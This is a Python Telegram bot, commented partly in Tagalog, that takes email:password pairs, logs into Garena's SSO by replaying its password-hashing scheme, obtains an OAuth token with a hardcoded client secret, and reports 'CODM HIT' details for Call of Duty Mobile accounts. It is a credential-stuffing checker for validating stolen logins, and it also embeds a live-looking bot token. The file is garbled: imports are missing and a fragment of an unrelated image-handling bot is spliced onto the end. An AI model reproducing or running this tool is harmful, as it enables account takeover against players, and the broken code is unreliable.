import requests
import time
import json
import uuid
import hashlib
import base64
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ===== WEBKEEP ALIVE =====
app_web = Flask(__name__)
OWNER_ID = int(os.getenv("OWNER_ID", "0"))

@app_web.route("/")
def home():
    return "Bot is online!"

def keep_alive():
    port = int(os.environ.get("PORT", 10000))
    Thread(target=lambda: app_web.run(host="0.0.0.0", port=port)).start()
    
# SETUP LOGGING
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- [ SECTION 1: HASHING & PRE-LOGIN ] ---

def get_passmd5(password):
    return hashlib.md5(password.encode()).hexdigest()

def encode(passmd5, outer_hash):
    return outer_hash

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def get_v1_v2(session, account):
    """Kinukuha ang v1 at v2 para sa accurate na login"""
    try:
        url = f"https://sso.garena.com/api/prelogin?app_id=10100&account={account}&format=json"
        res = session.get(url, timeout=10).json()
        return res.get('v1'), res.get('v2')
    except:
        return None, None

# --- [ SECTION 2: YOUR MAIN ENGINE ] ---

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    try:
        response = session.get(url, headers=headers, params=params, timeout=30)
        data = response.json()
        
        # Check cookies for sso_key
        sso_key = session.cookies.get('sso_key')
        if sso_key or ('error' not in data):
            return sso_key if sso_key else "success"
        return None
    except:
        return None

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = "https://100082.connect.garena.com/oauth/token/grant"
        grant_headers = {
            "User-Agent": "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "X-Requested-With": "com.garena.game.codm",
            "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code"
        }
        grant_data = f"client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}"
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        auth_code = grant_response.json().get("code", "")
        
        if not auth_code: return "", "", ""

        token_url = "https://100082.connect.garena.com/oauth/token/exchange"
        device_id = f"02-{str(uuid.uuid4())}"
        token_data = f"grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
        token_response = session.post(token_url, data=token_data, timeout=15)
        t_json = token_response.json()
        return t_json.get("access_token", ""), t_json.get("open_id", ""), t_json.get("uid", "")
    except:
        return "", "", ""

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        aos_url = f"https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        res = session.get(aos_url, allow_redirects=False, timeout=15)
        loc = res.headers.get("Location", "")
        if "token=" in loc:
            return loc.split("token=")[-1].split('&')[0], "success"
        return None, "no_codm"
    except:
        return None, "error"

def get_codm_user_info(session, token):
    try:
        url = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
        headers = {"codm-delete-token": token}
        res = session.get(url, headers=headers, timeout=15).json()
        return res.get("user", {})
    except:
        return {}

def check_codm_account(session, account):
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token: return False, {}
        codm_token, status = process_codm_callback(session, access_token)
        if status == "success":
            info = get_codm_user_info(session, codm_token)
            return True, info
    except: pass
    return False, {}

# --- [ SECTION 3: TELEGRAM BOT HANDLERS ] ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 **CODM Checker Bot Active!**\nSend: `email:password`", parse_mode='Markdown')

async def handle_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if ":" not in text: return

    acc, pwd = text.split(":", 1)
    status = await update.message.reply_text(f"⏳ Checking `{acc}`...", parse_mode='Markdown')
    
    session = requests.Session()
    v1, v2 = get_v1_v2(session, acc)
    
    if not v1 or not v2:
        await status.edit_text("❌ Error: Cannot fetch Garena Session (v1/v2).")
        return

    login_res = login(session, acc, pwd, v1, v2)
    
    if login_res:
        has_codm, info = check_codm_account(session, acc)
        if has_codm:
            msg = (f"✅ **CODM HIT!**\n\n"
                   f"👤 Nick: `{info.get('codm_nickname', 'N/A')}`\n"
                   f"📈 Level: `{info.get('codm_level', 'N/A')}`\n"
                   f"🌍 Region: `{info.get('region', 'N/A')}`")
        else:
            msg = f"⚠️ **GARENA OK:** `{acc}`\n(Pero walang CODM account)."
    else:
        msg = f"❌ **FAILED:** `{acc}` (Wrong password/Account not exist)"

    await status.edit_text(msg, parse_mode='Markdown')

# --- [ SECTION 4: MAIN RUNNER ] ---

if __name__ == '__main__':
    # ILAGAY ANG TOKEN MULA KAY @BotFather
    MY_TOKEN = "8626134374:AAF27vxpNvkD50YhidGHVwUkSmFega_-qb8" 
    
    app = Application.builder().token(MY_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_checker))
    
    print("Bot is running...")
    app.run_polling()            os.remove(photo_path)
        await status_msg.delete()

def main():
    if not TELEGRAM_TOKEN: return
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.PHOTO, handle_image))
    application.run_polling()

if __name__ == "__main__":
    keep_alive()
    main()
